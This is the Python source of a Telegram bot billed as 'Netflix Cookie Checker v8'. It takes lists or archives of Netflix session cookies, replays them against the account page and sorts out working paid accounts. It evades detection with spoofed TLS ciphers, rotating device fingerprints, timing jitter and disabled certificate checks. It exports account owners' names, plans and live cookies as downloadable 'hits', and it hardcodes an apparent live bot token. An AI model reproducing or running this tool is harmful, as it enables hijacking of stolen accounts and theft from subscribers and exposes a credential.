import os
import io
import re
import json
import zipfile
import asyncio
import logging
import random
import time
import ssl
from collections import OrderedDict

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ═══════════════════════════════════════════════════════════════
# TOKEN
# ═══════════════════════════════════════════════════════════════
TOKEN = os.getenv("NF_BOT_TOKEN", "") or "8601902143:AAFmbZ0v-FhanzkoGvQjHAsFcKmVE1V1yVs"

logging.basicConfig(level=logging.INFO)
if not TOKEN or TOKEN == "PASTE_YOUR_TOKEN_HERE":
    raise SystemExit("Set NF_BOT_TOKEN or paste token in script")

MAX_RETRIES = 2
MIN_DELAY = 0.35
MAX_DELAY = 1.6
COOLDOWN_429 = 20

# ═══════════════════════════════════════════════════════════════
# TLS FINGERPRINT SPOOF
# ═══════════════════════════════════════════════════════════════
CHROME_CIPHERS = (
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
    "ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:"
    "AES256-GCM-SHA384:AES128-SHA:AES256-SHA"
)


class ChromeAdapter(HTTPAdapter):
    def init_poolmanager(self, *a, **kw):
        ctx = create_urllib3_context(ciphers=CHROME_CIPHERS)
        ctx.options |= 0x4
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        kw["ssl_context"] = ctx
        return super().init_poolmanager(*a, **kw)


def new_session():
    s = requests.Session()
    a = ChromeAdapter(pool_connections=50, pool_maxsize=50)
    s.mount("https://", a)
    s.mount("http://", a)
    return s


# ═══════════════════════════════════════════════════════════════
# DEVICE FINGERPRINTS — 16 profiles (iPhone, iPad, Mac, Win, Linux,
# Android, Chrome, Safari, Firefox, Edge)
# ═══════════════════════════════════════════════════════════════
IPHONES = [
    {
        "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "sec-ch-ua": '"Safari";v="17", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"iOS"',
    },
    {
        "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "sec-ch-ua": '"Safari";v="16", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"iOS"',
    },
    {
        "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1",
        "sec-ch-ua": '"Safari";v="15", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"iOS"',
    },
    {
        "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/126.0.6478.54 Mobile/15E148 Safari/604.1",
        "sec-ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"iOS"',
    },
]

IPADS = [
    {
        "ua": "Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "sec-ch-ua": '"Safari";v="17", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"iPadOS"',
    },
    {
        "ua": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "sec-ch-ua": '"Safari";v="16", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"iPadOS"',
    },
]

LAPTOPS = [
    {
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"macOS"',
    },
    {
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "sec-ch-ua": '"Safari";v="17", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"macOS"',
    },
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    },
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.2592.87",
        "sec-ch-ua": '"Microsoft Edge";v="126", "Chromium";v="126", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    },
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "sec-ch-ua": '""',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '""',
    },
    {
        "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Linux"',
    },
    {
        "ua": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "sec-ch-ua": '""',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '""',
    },
]

ANDROIDS = [
    {
        "ua": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.71 Mobile Safari/537.36",
        "sec-ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
    },
    {
        "ua": "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
        "sec-ch-ua": '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
    },
    {
        "ua": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.71 Mobile Safari/537.36",
        "sec-ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
    },
]

ALL_PROFILES = IPHONES + IPADS + LAPTOPS + ANDROIDS

ACCEPT_LANGS = [
    "ar-SA,ar;q=0.9,en;q=0.8",
    "ar-AE,ar;q=0.9,en;q=0.8",
    "ar-EG,ar;q=0.9,en;q=0.8",
    "ar-JO,ar;q=0.9,en;q=0.8",
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
]


def pick_profile():
    return random.choice(ALL_PROFILES)


def device_name(ua):
    if "iPhone" in ua: return "iPhone"
    if "iPad" in ua: return "iPad"
    if "Android" in ua: return "Android"
    if "Macintosh" in ua: return "Mac"
    if "Windows" in ua: return "Windows"
    if "Linux" in ua: return "Linux"
    return "Device"


def build_headers(p, referer=None, nav=True):
    h = {
        "User-Agent": p["ua"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": "gzip, deflate, br",
        "sec-ch-ua": p["sec-ch-ua"],
        "sec-ch-ua-mobile": p["sec-ch-ua-mobile"],
        "sec-ch-ua-platform": p["sec-ch-ua-platform"],
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate" if nav else "cors",
        "Sec-Fetch-Site": "same-origin" if referer else "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "DNT": "1",
        "Connection": "keep-alive",
    }
    if referer:
        h["Referer"] = referer
    return h


def human_delay():
    time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))


# ═══════════════════════════════════════════════════════════════
# COOKIE PARSING
# ═══════════════════════════════════════════════════════════════
NF_NAMES = {"NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"}
NF_ID_RE = re.compile(r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})', re.I)
EMAIL_RE = re.compile(r"([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})")

SESSION = {}


def sess(uid):
    if uid not in SESSION:
        SESSION[uid] = {
            "awaiting": None,
            "hits": OrderedDict(),
            "busy": False,
            "pending": None,
        }
    return SESSION[uid]


def parse_cookies(text):
    text = (text or "").strip()
    out = []
    try:
        if text.startswith(("{", "[")):
            obj = json.loads(text)
            if isinstance(obj, dict):
                flat = {k: str(v) for k, v in obj.items() if k in NF_NAMES}
                if flat.get("NetflixId"):
                    out.append(flat)
                if isinstance(obj.get("cookies"), list):
                    m = {
                        c["name"]: c["value"]
                        for c in obj["cookies"]
                        if isinstance(c, dict)
                        and c.get("name") in NF_NAMES
                        and "value" in c
                    }
                    if m.get("NetflixId"):
                        out.append(m)
            elif isinstance(obj, list):
                m = {
                    c["name"]: c["value"]
                    for c in obj
                    if isinstance(c, dict)
                    and c.get("name") in NF_NAMES
                    and "value" in c
                }
                if m.get("NetflixId"):
                    out.append(m)
    except Exception:
        pass
    ns = []
    for line in text.splitlines():
        line = line.strip()
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_") :]
        elif line.startswith("#") or not line:
            continue
        p = line.split("\t")
        if len(p) >= 7 and p[5] in NF_NAMES:
            ns.append({"name": p[5], "value": p[6]})
    if ns:
        nf = [e for e in ns if e["name"] == "NetflixId"]
        if nf:
            for n in nf:
                cs = {"NetflixId": n["value"]}
                cs.update(
                    {e["name"]: e["value"] for e in ns if e["name"] != "NetflixId"}
                )
                out.append(cs)
        else:
            m = {e["name"]: e["value"] for e in ns}
            if m:
                out.append(m)
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        cs = {}
        for part in re.split(r"[;\s]+", line):
            if "=" in part:
                k, v = part.split("=", 1)
                if k.strip() in NF_NAMES:
                    cs[k.strip()] = v.strip()
        if cs.get("NetflixId"):
            out.append(cs)
    for m in NF_ID_RE.finditer(text):
        out.append({"NetflixId": m.group(1).strip("\"'")})
    seen, uniq = set(), []
    for cs in out:
        if not cs.get("NetflixId"):
            continue
        h = json.dumps(cs, sort_keys=True)
        if h in seen:
            continue
        seen.add(h)
        uniq.append(cs)
    return uniq


def cookies_from_zip(data):
    out = []
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        for n in z.namelist():
            if n.endswith("/") or n.startswith(("__MACOSX", ".")):
                continue
            if not n.lower().endswith((".txt", ".json")):
                continue
            try:
                out.extend(parse_cookies(z.read(n).decode("utf-8", "ignore")))
            except Exception:
                continue
    seen, uniq = set(), []
    for cs in out:
        h = json.dumps(cs, sort_keys=True)
        if h in seen:
            continue
        seen.add(h)
        uniq.append(cs)
    return uniq


# ═══════════════════════════════════════════════════════════════
# CHECK
# ═══════════════════════════════════════════════════════════════
def check_cookie(cd):
    if not cd.get("NetflixId"):
        return {"ok": False, "reason": "no_id", "retries": 0}
    profile = pick_profile()
    s = new_session()
    s.cookies.update(cd)
    retries = 0
    last_err = None
    for attempt in range(MAX_RETRIES + 1):
        try:
            try:
                s.get(
                    "https://www.netflix.com/",
                    headers=build_headers(profile, referer=None),
                    timeout=20,
                    verify=False,
                    allow_redirects=True,
                )
                human_delay()
            except Exception:
                pass
            try:
                s.get(
                    "https://www.netflix.com/browse",
                    headers=build_headers(profile, referer="https://www.netflix.com/"),
                    timeout=20,
                    verify=False,
                    allow_redirects=True,
                )
                human_delay()
            except Exception:
                pass
            r = s.get(
                "https://www.netflix.com/YourAccount",
                headers=build_headers(profile, referer="https://www.netflix.com/browse"),
                timeout=25,
                verify=False,
                allow_redirects=True,
            )
            if r.status_code in (429, 502, 503, 504):
                retries += 1
                time.sleep(COOLDOWN_429 + random.uniform(0, 10))
                last_err = "http_" + str(r.status_code)
                continue
            if "login" in r.url.lower() or r.status_code != 200:
                return {"ok": False, "reason": "dead", "retries": retries}
            txt = r.text

            def find(p):
                m = re.search(p, txt)
                return m.group(1) if m else None

            name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(
                r'"firstName"\s*:\s*"([^"]+)"'
            )
            plan = find(r'"planName"\s*:\s*"([^"]+)"') or find(
                r'localizedPlanName.{1,50}?value":"([^"]+)"'
            )
            ctry = find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
            email = find(r'"emailAddress"\s*:\s*"([^"]+)"')
            ms = find(r'"membershipStatus"\s*:\s*"([^"]+)"')
            hold = bool(re.search(r'"isUserOnHold"\s*:\s*true', txt))
            if not name and not plan and not ctry:
                return {"ok": False, "reason": "no_data", "retries": retries}
            plan_l = (plan or "").lower()
            paid = (
                ms == "CURRENT_MEMBER"
                and "free" not in plan_l
                and plan_l not in ("", "unknown")
            )
            if email:
                email = EMAIL_RE.sub(lambda m: m.group(1) + "***" + m.group(2), email)
            return {
                "ok": True,
                "paid": paid,
                "hold": hold,
                "name": name or "?",
                "plan": plan or "?",
                "country": ctry or "?",
                "email": email or "?",
                "status": ms or "?",
                "cookie": cd,
                "retries": retries,
                "device": device_name(profile["ua"]),
            }
        except requests.RequestException as e:
            last_err = str(e)[:50]
            retries += 1
            time.sleep(2 + random.uniform(0, 2))
            continue
    return {"ok": False, "reason": last_err or "failed", "retries": retries}


# ═══════════════════════════════════════════════════════════════
# PREMIUM UI
# ═══════════════════════════════════════════════════════════════
def kb_main():
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("🔍 Check Cookie", callback_data="do_check")],
            [
                InlineKeyboardButton("📊 Bot Info", callback_data="stats"),
                InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
            ],
            [
                InlineKeyboardButton("💎 Premium", callback_data="premium"),
                InlineKeyboardButton("❌ Close", callback_data="close"),
            ],
        ]
    )


def kb_back():
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("⬅️ Back", callback_data="menu")]]
    )


def kb_workers():
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("🚶 1 Worker (Stealth)", callback_data="wk_1")],
            [InlineKeyboardButton("🏃 5 Workers (Balanced)", callback_data="wk_5")],
            [InlineKeyboardButton("🚀 10 Workers (Fast)", callback_data="wk_10")],
            [InlineKeyboardButton("⚡ 20 Workers (Turbo)", callback_data="wk_20")],
            [InlineKeyboardButton("⬅️ Cancel", callback_data="menu")],
        ]
    )


def p_menu():
    return (
        "🎬 <b>NETFLIX COOKIE CHECKER v8</b> 🍪\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "     💎 <b>ULTRA-STEALTH MODE</b> 💎\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👋 <b>Welcome, boss!</b>\n\n"
        "🚀 <b>HOW TO USE:</b>\n"
        "├ 1️⃣ Tap <b>🔍 Check Cookie</b>\n"
        "├ 2️⃣ Paste cookie / NetflixId\n"
        "├ 3️⃣ Or upload <code>.txt</code> / <code>.zip</code>\n"
        "├ 4️⃣ Choose worker count\n"
        "└ 5️⃣ Get 💎 <b>paid, no-hold</b> hits\n\n"
        "⚡ <b>ANTI-DETECT STACK:</b>\n"
        "├ 🕵️ 16 device fingerprints\n"
        "├ 🔐 Chrome 126 TLS cipher spoof\n"
        "├ 🌍 Arab locale (ar-SA / ar-AE)\n"
        "├ 🎭 Full browser header chain\n"
        "├ 🧠 Human delay jitter (0.35-1.6s)\n"
        "├ 🔗 Referer chain warm-up\n"
        "├ 🍪 Cookie jar persistence\n"
        "├ 🛑 20s cooldown on 429\n"
        "└ 💎 Paid &amp; no-hold filter\n\n"
        "🤖 <i>Netflix sees a real iPhone.</i>"
    )


def p_stats():
    return (
        "📊 <b>BOT INFORMATION</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎭 <b>Fingerprints:</b> 16 profiles\n"
        "   ├ 🍎 iPhone: 4\n"
        "   ├ 📱 iPad: 2\n"
        "   ├ 💻 Mac: 2\n"
        "   ├ 🪟 Windows: 3\n"
        "   ├ 🐧 Linux: 2\n"
        "   └ 🤖 Android: 3\n\n"
        "🔐 <b>TLS:</b> Chrome 126 cipher order\n"
        "🌍 <b>Locale:</b> ar-SA / ar-AE / ar-EG / ar-JO / en-US / en-GB\n"
        "🧠 <b>Delay:</b> 0.35–1.6s jitter\n"
        "🔁 <b>Retries:</b> 2 (20s cooldown)\n"
        "💎 <b>Filter:</b> Paid + No-Hold only\n"
        "⚙️ <b>Worker options:</b> 1 / 5 / 10 / 20\n\n"
        "🛡 <b>Stealth Layers:</b> 9\n"
        "🏆 <b>Detection Risk:</b> Ultra Low"
    )


def p_settings():
    return (
        "⚙️ <b>SETTINGS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎛 <b>Available Options:</b>\n"
        "├ ⚡ Worker speed: <b>1 / 5 / 10 / 20</b>\n"
        "├ 🎭 Device rotation: <b>Auto</b>\n"
        "├ 🌍 Locale: <b>Auto (Arab match)</b>\n"
        "├ 🔁 Retries: <b>2</b>\n"
        "└ 💎 Filter: <b>Paid + No-Hold</b>\n\n"
        "💡 <i>Workers are picked per-check.</i>"
    )


def p_premium():
    return (
        "💎 <b>PREMIUM ACCESS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🌟 <b>Unlock Full Power</b>\n\n"
        "🎁 <b>Premium Benefits:</b>\n"
        "├ ⚡ Up to 20 workers\n"
        "├ 🚀 Priority speed\n"
        "├ 📊 Advanced stats\n"
        "├ 💾 Unlimited batch size\n"
        "└ 🛡 Priority support\n\n"
        "💰 <b>Coming soon — stay tuned!</b>\n\n"
        "🤖 <i>Bot is currently FREE &amp; OPEN</i>"
    )


async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    sess(update.effective_user.id)["awaiting"] = None
    await update.message.reply_text(p_menu(), reply_markup=kb_main(), parse_mode="HTML")


async def cb_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    s = sess(uid)
    s["awaiting"] = None
    s["pending"] = None
    await q.edit_message_text(p_menu(), reply_markup=kb_main(), parse_mode="HTML")
    await q.answer()


async def cb_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    s = sess(uid)
    s["awaiting"] = "check"
    await q.edit_message_text(
        "🔍 <b>CHECK MODE ACTIVE</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📋 Paste cookie or NetflixId\n"
        "📦 Or upload <code>.txt</code> / <code>.zip</code>\n\n"
        "🎭 <b>Stealth:</b> ON\n"
        "🕵️ <i>Netflix sees a real device</i>",
        reply_markup=kb_back(),
        parse_mode="HTML",
    )
    await q.answer()


async def cb_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.edit_message_text(p_stats(), reply_markup=kb_back(), parse_mode="HTML")
    await q.answer()


async def cb_settings(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.edit_message_text(p_settings(), reply_markup=kb_back(), parse_mode="HTML")
    await q.answer()


async def cb_premium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.edit_message_text(p_premium(), reply_markup=kb_back(), parse_mode="HTML")
    await q.answer()


async def cb_close(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        await q.message.delete()
    except Exception:
        await q.edit_message_text("❌ Closed. /start to reopen.")
    await q.answer()


async def cb_worker(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    s = sess(uid)
    n = int(q.data.split("_")[1])
    cookies = s.get("pending") or []
    if not cookies:
        await q.answer("❌ No cookies loaded. Tap Check first.", show_alert=True)
        return
    if s.get("busy"):
        await q.answer("⚠️ Already running.", show_alert=True)
        return
    await q.answer(f"🚀 Starting with {n} worker(s)...")
    s["pending"] = None
    s["awaiting"] = None
    asyncio.create_task(run_check(q.message, uid, cookies, ctx, n))


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = sess(uid)
    if s.get("awaiting") != "check" or s.get("busy"):
        return
    cookies = parse_cookies(update.message.text or "")
    if not cookies:
        await update.message.reply_text("❌ No NetflixId found. Try again.")
        return
    await update.message.reply_text(
        f"📊 <b>{len(cookies)}</b> cookie(s) loaded.\n\n"
        "⚡ <b>Choose worker count:</b>",
        reply_markup=kb_workers(),
        parse_mode="HTML",
    )
    s["pending"] = cookies


async def on_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = sess(uid)
    if s.get("awaiting") != "check" or s.get("busy"):
        await update.message.reply_text("⚠️ Tap <b>Check Cookie</b> first from /start.",
                                        parse_mode="HTML")
        return
    doc = update.message.document
    if not doc:
        return
    name = doc.file_name.lower()
    if not name.endswith((".txt", ".zip")):
        await update.message.reply_text("❌ Only .txt or .zip supported.")
        return
    f = await doc.get_file()
    data = await f.download_as_bytearray()
    if name.endswith(".zip"):
        cookies = cookies_from_zip(bytes(data))
    else:
        cookies = parse_cookies(bytes(data).decode("utf-8", "ignore"))
    if not cookies:
        await update.message.reply_text("❌ No cookies found in file.")
        return
    await update.message.reply_text(
        f"📊 <b>{len(cookies)}</b> cookie(s) loaded.\n\n"
        "⚡ <b>Choose worker count:</b>",
        reply_markup=kb_workers(),
        parse_mode="HTML",
    )
    s["pending"] = cookies


# ═══════════════════════════════════════════════════════════════
# RUNNER
# ═══════════════════════════════════════════════════════════════
async def run_check(msg, uid, cookies, ctx, workers):
    s = sess(uid)
    s["busy"] = True
    total = len(cookies)
    checked = hits = fails = retries_total = 0
    paid_hits = []
    device_counts = {}
    start_t = time.time()

    prog = await msg.reply_text(
        "🚀 <b>Starting ultra-stealth check...</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total: <b>{total}</b>\n"
        f"⚡ Workers: <b>{workers}</b>\n"
        "🎭 Fingerprints: <b>rotating (16)</b>",
        parse_mode="HTML",
    )

    sem = asyncio.Semaphore(workers)

    async def one(cd):
        nonlocal checked, hits, fails, retries_total
        async with sem:
            r = await asyncio.to_thread(check_cookie, cd)
        checked += 1
        retries_total += r.get("retries", 0)
        dev = r.get("device", "?")
        device_counts[dev] = device_counts.get(dev, 0) + 1
        if r.get("ok") and r.get("paid") and not r.get("hold"):
            hits += 1
            paid_hits.append(r)
        else:
            fails += 1
        if checked % 3 == 0 or checked == total:
            elapsed = time.time() - start_t
            spd = checked / elapsed if elapsed > 0 else 0
            pct = int(checked * 100 / total) if total else 0
            fill = int(pct / 10)
            bar = "█" * fill + "░" * (10 - fill)
            dev_line = " | ".join(f"{k}:{v}" for k, v in list(device_counts.items())[:4])
            txt = (
                "🔍 <b>Checking Netflix Cookies...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📊 <b>Progress:</b> {checked}/{total} ({pct}%)\n"
                f"<code>{bar}</code>\n\n"
                f"💎 <b>Paid Hits:</b> {hits}\n"
                f"❌ <b>Fails:</b> {fails}\n"
                f"🔁 <b>Retries:</b> {retries_total}\n"
                f"⚡ <b>Speed:</b> {spd:.2f}/s\n"
                f"⏱️ <b>Elapsed:</b> {elapsed:.1f}s\n"
                f"🎭 {dev_line}"
            )
            try:
                await prog.edit_text(txt, parse_mode="HTML")
            except Exception:
                pass

    await asyncio.gather(*[one(cd) for cd in cookies])

    s["busy"] = False
    s["awaiting"] = None
    s["hits"] = OrderedDict((f"H{i+1}", h) for i, h in enumerate(paid_hits))

    elapsed = time.time() - start_t
    spd = checked / elapsed if elapsed > 0 else 0
    dev_line = " | ".join(f"{k}:{v}" for k, v in device_counts.items())

    summary = (
        "✅ <b>CHECK COMPLETE!</b> 🎉\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📊 <b>Stats A→Z</b>\n"
        "╔══════════════════════════╗\n"
        f"║ 🍪 Total:     <b>{total}</b>\n"
        f"║ 🔍 Checked:   <b>{checked}</b>\n"
        f"║ 💎 Paid Hits: <b>{hits}</b>\n"
        f"║ ❌ Fails:     <b>{fails}</b>\n"
        f"║ 🔁 Retries:   <b>{retries_total}</b>\n"
        f"║ ⚡ Speed:     <b>{spd:.2f}/s</b>\n"
        f"║ ⏱️ Time:      <b>{elapsed:.1f}s</b>\n"
        f"║ ⚙️ Workers:   <b>{workers}</b>\n"
        "╚══════════════════════════╝\n\n"
        f"🎭 <b>Devices used:</b>\n{dev_line}\n\n"
    )

    if hits:
        summary += "🎉 <b>Paid accounts found — tap to download!</b>"
        markup = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("📄 Download .txt", callback_data="dl_txt")],
                [InlineKeyboardButton("⬅️ Back", callback_data="menu")],
            ]
        )
    else:
        summary += "😔 <b>No paid &amp; no-hold accounts found.</b>"
        markup = kb_back()

    try:
        await prog.edit_text(summary, reply_markup=markup, parse_mode="HTML")
    except Exception:
        await msg.reply_text(summary, reply_markup=markup, parse_mode="HTML")


async def dl(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    s = sess(q.from_user.id)
    hits = s.get("hits") or {}
    if not hits:
        await q.answer("❌ No hits.", show_alert=True)
        return
    lines = ["🍪 NETFLIX PAID HITS 🍪", "=" * 40, ""]
    for i, (k, v) in enumerate(hits.items(), 1):
        lines.append(f"🎯 HIT #{i}")
        lines.append(f"👤 Name:    {v.get('name', '?')}")
        lines.append(f"📦 Plan:    {v.get('plan', '?')}")
        lines.append(f"🌍 Country: {v.get('country', '?')}")
        lines.append(f"📧 Email:   {v.get('email', '?')}")
        lines.append(f"📊 Status:  {v.get('status', '?')}")
        lines.append(f"🔁 Retries: {v.get('retries', 0)}")
        lines.append(f"🎭 Device:  {v.get('device', '?')}")
        lines.append("🍪 Cookies:")
        for kk, vv in v.get("cookie", {}).items():
            lines.append(f"  {kk}={vv}")
        lines.append("")
    buf = io.BytesIO("\n".join(lines).encode())
    await ctx.bot.send_document(
        q.message.chat_id,
        document=InputFile(buf, filename="netflix_paid_hits.txt"),
        caption=f"💎 {len(hits)} paid, no-hold accounts",
    )
    await q.answer("📄 Sent!")


def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))

    # ORDER MATTERS: specific patterns FIRST
    app.add_handler(CallbackQueryHandler(dl, pattern="^dl_txt$"))
    app.add_handler(CallbackQueryHandler(cb_menu, pattern="^menu$"))
    app.add_handler(CallbackQueryHandler(cb_check, pattern="^do_check$"))
    app.add_handler(CallbackQueryHandler(cb_stats, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(cb_settings, pattern="^settings$"))
    app.add_handler(CallbackQueryHandler(cb_premium, pattern="^premium$"))
    app.add_handler(CallbackQueryHandler(cb_close, pattern="^close$"))
    app.add_handler(CallbackQueryHandler(cb_worker, pattern="^wk_(1|5|10|20)$"))

    app.add_handler(MessageHandler(filters.Document.ALL, on_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()